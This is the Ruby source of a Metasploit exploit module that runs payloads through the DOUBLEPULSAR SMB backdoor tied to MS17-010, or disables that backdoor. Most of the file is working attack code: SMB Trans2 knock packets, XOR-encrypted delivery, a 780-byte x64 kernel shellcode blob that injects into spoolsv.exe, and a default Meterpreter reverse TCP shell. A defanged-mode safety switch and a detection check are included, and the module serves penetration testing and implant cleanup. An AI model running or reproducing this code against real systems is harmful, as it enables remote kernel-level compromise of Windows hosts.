##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

# class MetasploitModule < Msf::Exploit::Remote  Rank = GreatRanking

  include Msf::Exploit::Remote::SMB::Client

  MAX_SHELLCODE_SIZE = 4096

  def initialize(info = {})
    super(update_info(info,
      'Name'             => 'DOUBLEPULSAR Payload Execution and Neutralization',
      'Description'      => %q{
        This module executes a Metasploit payload against the Equation Group's
        DOUBLEPULSAR implant for SMB as popularly deployed by ETERNALBLUE.

        While this module primarily performs code execution against the implant,
        the "Neutralize implant" target allows you to disable the implant.
      },
      'Author'           => [
        'Equation Group', # DOUBLEPULSAR implant
        'Shadow Brokers', # Equation Group dump
        'zerosum0x0',     # DOPU analysis and detection
        'Luke Jennings',  # DOPU analysis and detection
        'wvu',            # Metasploit module and arch detection
        'Jacob Robles'    # Metasploit module and RCE help
      ],
      'References'       => [
        ['MSB', 'MS17-010'],
        ['CVE', '2017-0143'],
        ['CVE', '2017-0144'],
        ['CVE', '2017-0145'],
        ['CVE', '2017-0146'],
        ['CVE', '2017-0147'],
        ['CVE', '2017-0148'],
        ['URL', 'https://zerosum0x0.blogspot.com/2017/04/doublepulsar-initial-smb-backdoor-ring.html'],
        ['URL', 'https://countercept.com/blog/analyzing-the-doublepulsar-kernel-dll-injection-technique/'],
        ['URL', 'https://www.countercept.com/blog/doublepulsar-usermode-analysis-generic-reflective-dll-loader/'],
        ['URL', 'https://github.com/countercept/doublepulsar-detection-script'],
        ['URL', 'https://github.com/countercept/doublepulsar-c2-traffic-decryptor'],
        ['URL', 'https://gist.github.com/msuiche/50a36710ee59709d8c76fa50fc987be1']
      ],
      'DisclosureDate'   => '2017-04-14',
      'License'          => MSF_LICENSE,
      'Platform'         => 'win',
      'Arch'             => ARCH_X64,
      'Privileged'       => true,
      'Payload'          => {
        'Space'          => MAX_SHELLCODE_SIZE - kernel_shellcode_size,
        'DisableNops'    => true
      },
      'Targets'          => [
        ['Execute payload',    {}],
        ['Neutralize implant', {}]
      ],
      'DefaultTarget'    => 0,
      'DefaultOptions'   => {
        'EXITFUNC'       => 'thread',
        'PAYLOAD'        => 'windows/x64/meterpreter/reverse_tcp'
      },
      'Notes'            => {
        'AKA'            => ['DOUBLEPULSAR'],
        'RelatedModules' => [
          'auxiliary/scanner/smb/smb_ms17_010',
          'exploit/windows/smb/ms17_010_eternalblue'
        ],
        'Stability'      => [CRASH_SAFE],
        'Reliability'    => [REPEATABLE_SESSION]
      }
    ))

    register_advanced_options([
      OptBool.new('DefangedMode',  [true, 'Run in defanged mode', true]),
      OptString.new('ProcessName', [true, 'Process to inject payload into', 'spoolsv.exe'])
    ])
  end

  OPCODES = {
    ping: 0x23,
    exec: 0xc8,
    kill: 0x77
  }

  STATUS_CODES = {
    not_detected:   0x00,
    success:        0x10,
    invalid_params: 0x20,
    alloc_failure:  0x30
  }

  def calculate_doublepulsar_status(m1, m2)
    STATUS_CODES.key(m2.to_i - m1.to_i)
  end

  # algorithm to calculate the XOR Key for DoublePulsar knocks
  def calculate_doublepulsar_xor_key(s)
    x = (2 * s ^ (((s & 0xff00 | (s << 16)) << 8) | (((s >> 16) | s & 0xff0000) >> 8)))
    x & 0xffffffff  # this line was added just to truncate to 32 bits
  end

  # The arch is adjacent to the XOR key in the SMB signature
  def calculate_doublepulsar_arch(s)
    s == 0 ? ARCH_X86 : ARCH_X64
  end

  def generate_doublepulsar_timeout(op)
    k = SecureRandom.random_bytes(4).unpack('V').first
    0xff & (op - ((k & 0xffff00) >> 16) - (0xffff & (k & 0xff00) >> 8)) | k & 0xffff00
  end

  def generate_doublepulsar_param(op, body)
    case OPCODES.key(op)
    when :ping, :kill
      "\x00" * 12
    when :exec
      Rex::Text.xor([@xor_key].pack('V'), [body.length, body.length, 0].pack('V*'))
    end
  end

  def check
    ipc_share = "\\\\#{rhost}\\IPC$"

    @tree_id = do_smb_setup_tree(ipc_share)
    vprint_good("Connected to #{ipc_share} with TID = #{@tree_id}")
    vprint_status("Target OS is #{smb_peer_os}")

    vprint_status('Sending ping to DOUBLEPULSAR')
    code, signature1, signature2 = do_smb_doublepulsar_pkt
    msg = 'Host is likely INFECTED with DoublePulsar!'

    case calculate_doublepulsar_status(@multiplex_id, code)
    when :success
      @xor_key = calculate_doublepulsar_xor_key(signature1)
      @arch = calculate_doublepulsar_arch(signature2)

      arch_str =
        case @arch
        when ARCH_X86
          'x86 (32-bit)'
        when ARCH_X64
          'x64 (64-bit)'
        end

      vprint_good("#{msg} - Arch: #{arch_str}, XOR Key: 0x#{@xor_key.to_s(16).upcase}")
      CheckCode::Vulnerable
    when :not_detected
      vprint_error('DOUBLEPULSAR not detected or disabled')
      CheckCode::Safe
    else
      vprint_error('An unknown error occurred')
      CheckCode::Unknown
    end
  end

  def exploit
    if datastore['DefangedMode']
      warning = <<~EOF


        Are you SURE you want to execute code against a nation-state implant?
        You MAY contaminate forensic evidence if there is an investigation.

        Disable the DefangedMode option if you have authorization to proceed.
      EOF

      fail_with(Failure::BadConfig, warning)
    end

    # No ForceExploit because @tree_id and @xor_key are required
    unless check == CheckCode::Vulnerable
      fail_with(Failure::NotVulnerable, 'Unable to proceed without DOUBLEPULSAR')
    end

    case target.name
    when 'Execute payload'
      unless @xor_key
        fail_with(Failure::NotFound, 'XOR key not found')
      end

      if @arch == ARCH_X86
        fail_with(Failure::NoTarget, 'x86 is not a supported target')
      end

      print_status("Generating kernel shellcode with #{datastore['PAYLOAD']}")
      shellcode = make_kernel_user_payload(payload.encoded, datastore['ProcessName'])
      shellcode << Rex::Text.rand_text(MAX_SHELLCODE_SIZE - shellcode.length)
      vprint_status("Total shellcode length: #{shellcode.length} bytes")

      print_status("Encrypting shellcode with XOR key 0x#{@xor_key.to_s(16).upcase}")
      xor_shellcode = Rex::Text.xor([@xor_key].pack('V'), shellcode)

      print_status('Sending shellcode to DOUBLEPULSAR')
      code, _signature1, _signature2 = do_smb_doublepulsar_pkt(OPCODES[:exec], xor_shellcode)
    when 'Neutralize implant'
      return neutralize_implant
    end

    case calculate_doublepulsar_status(@multiplex_id, code)
    when :success
      print_good('Payload execution successful')
    when :invalid_params
      fail_with(Failure::BadConfig, 'Invalid parameters were specified')
    when :alloc_failure
      fail_with(Failure::PayloadFailed, 'An allocation failure occurred')
    else
      fail_with(Failure::Unknown, 'An unknown error occurred')
    end
  ensure
    disconnect
  end

  def neutralize_implant
    print_status('Neutralizing DOUBLEPULSAR')
    code, _signature1, _signature2 = do_smb_doublepulsar_pkt(OPCODES[:kill])

    case calculate_doublepulsar_status(@multiplex_id, code)
    when :success
      print_good('Implant neutralization successful')
    else
      fail_with(Failure::Unknown, 'An unknown error occurred')
    end
  end

  def do_smb_setup_tree(ipc_share)
    connect

    # logon as user \
    simple.login(datastore['SMBName'], datastore['SMBUser'], datastore['SMBPass'], datastore['SMBDomain'])

    # connect to IPC$
    simple.connect(ipc_share)

    # return tree
    simple.shares[ipc_share]
  end

  def do_smb_doublepulsar_pkt(opcode = OPCODES[:ping], body = nil)
    # make doublepulsar knock
    pkt = make_smb_trans2_doublepulsar(opcode, body)

    sock.put(pkt)
    bytes = sock.get_once

    return unless bytes

    # convert packet to response struct
    pkt = Rex::Proto::SMB::Constants::SMB_TRANS_RES_HDR_PKT.make_struct
    pkt.from_s(bytes[4..-1])

    return pkt['SMB'].v['MultiplexID'], pkt['SMB'].v['Signature1'], pkt['SMB'].v['Signature2']
  end

  def make_smb_trans2_doublepulsar(opcode, body)
    setup_count = 1
    setup_data = [0x000e].pack('v')

    param = generate_doublepulsar_param(opcode, body)
    data = param + body.to_s

    pkt = Rex::Proto::SMB::Constants::SMB_TRANS2_PKT.make_struct
    simple.client.smb_defaults(pkt['Payload']['SMB'])

    base_offset = pkt.to_s.length + (setup_count * 2) - 4
    param_offset = base_offset
    data_offset = param_offset + param.length

    pkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_TRANSACTION2
    pkt['Payload']['SMB'].v['Flags1'] = 0x18
    pkt['Payload']['SMB'].v['Flags2'] = 0xc007

    @multiplex_id = rand(0xffff)

    pkt['Payload']['SMB'].v['WordCount'] = 14 + setup_count
    pkt['Payload']['SMB'].v['TreeID'] = @tree_id
    pkt['Payload']['SMB'].v['MultiplexID'] = @multiplex_id

    pkt['Payload'].v['ParamCountTotal'] = param.length
    pkt['Payload'].v['DataCountTotal'] = body.to_s.length
    pkt['Payload'].v['ParamCountMax'] = 1
    pkt['Payload'].v['DataCountMax'] = 0
    pkt['Payload'].v['ParamCount'] = param.length
    pkt['Payload'].v['ParamOffset'] = param_offset
    pkt['Payload'].v['DataCount'] = body.to_s.length
    pkt['Payload'].v['DataOffset'] = data_offset
    pkt['Payload'].v['SetupCount'] = setup_count
    pkt['Payload'].v['SetupData'] = setup_data
    pkt['Payload'].v['Timeout'] = generate_doublepulsar_timeout(opcode)
    pkt['Payload'].v['Payload'] = data

    pkt.to_s
  end

  # ring3 = user mode encoded payload
  # proc_name = process to inject APC into
  def make_kernel_user_payload(ring3, proc_name)
    sc = make_kernel_shellcode(proc_name)

    sc << [ring3.length].pack("S<")
    sc << ring3

    sc
  end

  def generate_process_hash(process)
    # x64_calc_hash from external/source/shellcode/windows/multi_arch_kernel_queue_apc.asm
    proc_hash = 0
    process << "\x00"

    process.each_byte do |c|
      proc_hash  = ror(proc_hash, 13)
      proc_hash += c
    end

    [proc_hash].pack('l<')
  end

  def ror(dword, bits)
    (dword >> bits | dword << (32 - bits)) & 0xFFFFFFFF
  end

  def make_kernel_shellcode(proc_name)
    # see: external/source/shellcode/windows/multi_arch_kernel_queue_apc.asm
    # Length: 780 bytes
    "\x31\xc9\x41\xe2\x01\xc3\x56\x41\x57\x41\x56\x41\x55\x41\x54\x53" +
    "\x55\x48\x89\xe5\x66\x83\xe4\xf0\x48\x83\xec\x20\x4c\x8d\x35\xe3" +
    "\xff\xff\xff\x65\x4c\x8b\x3c\x25\x38\x00\x00\x00\x4d\x8b\x7f\x04" +
    "\x49\xc1\xef\x0c\x49\xc1\xe7\x0c\x49\x81\xef\x00\x10\x00\x00\x49" +
    "\x8b\x37\x66\x81\xfe\x4d\x5a\x75\xef\x41\xbb\x5c\x72\x11\x62\xe8" +
    "\x18\x02\x00\x00\x48\x89\xc6\x48\x81\xc6\x08\x03\x00\x00\x41\xbb" +
    "\x7a\xba\xa3\x30\xe8\x03\x02\x00\x00\x48\x89\xf1\x48\x39\xf0\x77" +
    "\x11\x48\x8d\x90\x00\x05\x00\x00\x48\x39\xf2\x72\x05\x48\x29\xc6" +
    "\xeb\x08\x48\x8b\x36\x48\x39\xce\x75\xe2\x49\x89\xf4\x31\xdb\x89" +
    "\xd9\x83\xc1\x04\x81\xf9\x00\x00\x01\x00\x0f\x8d\x66\x01\x00\x00" +
    "\x4c\x89\xf2\x89\xcb\x41\xbb\x66\x55\xa2\x4b\xe8\xbc\x01\x00\x00" +
    "\x85\xc0\x75\xdb\x49\x8b\x0e\x41\xbb\xa3\x6f\x72\x2d\xe8\xaa\x01" +
    "\x00\x00\x48\x89\xc6\xe8\x50\x01\x00\x00\x41\x81\xf9" +
    generate_process_hash(proc_name.upcase) +
    "\x75\xbc\x49\x8b\x1e\x4d\x8d\x6e\x10\x4c\x89\xea\x48\x89\xd9" +
    "\x41\xbb\xe5\x24\x11\xdc\xe8\x81\x01\x00\x00\x6a\x40\x68\x00\x10" +
    "\x00\x00\x4d\x8d\x4e\x08\x49\xc7\x01\x00\x10\x00\x00\x4d\x31\xc0" +
    "\x4c\x89\xf2\x31\xc9\x48\x89\x0a\x48\xf7\xd1\x41\xbb\x4b\xca\x0a" +
    "\xee\x48\x83\xec\x20\xe8\x52\x01\x00\x00\x85\xc0\x0f\x85\xc8\x00" +
    "\x00\x00\x49\x8b\x3e\x48\x8d\x35\xe9\x00\x00\x00\x31\xc9\x66\x03" +
    "\x0d\xd7\x01\x00\x00\x66\x81\xc1\xf9\x00\xf3\xa4\x48\x89\xde\x48" +
    "\x81\xc6\x08\x03\x00\x00\x48\x89\xf1\x48\x8b\x11\x4c\x29\xe2\x51" +
    "\x52\x48\x89\xd1\x48\x83\xec\x20\x41\xbb\x26\x40\x36\x9d\xe8\x09" +
    "\x01\x00\x00\x48\x83\xc4\x20\x5a\x59\x48\x85\xc0\x74\x18\x48\x8b" +
    "\x80\xc8\x02\x00\x00\x48\x85\xc0\x74\x0c\x48\x83\xc2\x4c\x8b\x02" +
    "\x0f\xba\xe0\x05\x72\x05\x48\x8b\x09\xeb\xbe\x48\x83\xea\x4c\x49" +
    "\x89\xd4\x31\xd2\x80\xc2\x90\x31\xc9\x41\xbb\x26\xac\x50\x91\xe8" +
    "\xc8\x00\x00\x00\x48\x89\xc1\x4c\x8d\x89\x80\x00\x00\x00\x41\xc6" +
    "\x01\xc3\x4c\x89\xe2\x49\x89\xc4\x4d\x31\xc0\x41\x50\x6a\x01\x49" +
    "\x8b\x06\x50\x41\x50\x48\x83\xec\x20\x41\xbb\xac\xce\x55\x4b\xe8" +
    "\x98\x00\x00\x00\x31\xd2\x52\x52\x41\x58\x41\x59\x4c\x89\xe1\x41" +
    "\xbb\x18\x38\x09\x9e\xe8\x82\x00\x00\x00\x4c\x89\xe9\x41\xbb\x22" +
    "\xb7\xb3\x7d\xe8\x74\x00\x00\x00\x48\x89\xd9\x41\xbb\x0d\xe2\x4d" +
    "\x85\xe8\x66\x00\x00\x00\x48\x89\xec\x5d\x5b\x41\x5c\x41\x5d\x41" +
    "\x5e\x41\x5f\x5e\xc3\xe9\xb5\x00\x00\x00\x4d\x31\xc9\x31\xc0\xac" +
    "\x41\xc1\xc9\x0d\x3c\x61\x7c\x02\x2c\x20\x41\x01\xc1\x38\xe0\x75" +
    "\xec\xc3\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52" +
    "\x20\x48\x8b\x12\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x45\x31\xc9" +
    "\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1" +
    "\xe2\xee\x45\x39\xd9\x75\xda\x4c\x8b\x7a\x20\xc3\x4c\x89\xf8\x41" +
    "\x51\x41\x50\x52\x51\x56\x48\x89\xc2\x8b\x42\x3c\x48\x01\xd0\x8b" +
    "\x80\x88\x00\x00\x00\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20" +
    "\x49\x01\xd0\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\xe8\x78\xff" +
    "\xff\xff\x45\x39\xd9\x75\xec\x58\x44\x8b\x40\x24\x49\x01\xd0\x66" +
    "\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48" +
    "\x01\xd0\x5e\x59\x5a\x41\x58\x41\x59\x41\x5b\x41\x53\xff\xe0\x56" +
    "\x41\x57\x55\x48\x89\xe5\x48\x83\xec\x20\x41\xbb\xda\x16\xaf\x92" +
    "\xe8\x4d\xff\xff\xff\x31\xc9\x51\x51\x51\x51\x41\x59\x4c\x8d\x05" +
    "\x1a\x00\x00\x00\x5a\x48\x83\xec\x20\x41\xbb\x46\x45\x1b\x22\xe8" +
    "\x68\xff\xff\xff\x48\x89\xec\x5d\x41\x5f\x5e\xc3"
  end

  def kernel_shellcode_size
    make_kernel_shellcode('').length
  end

end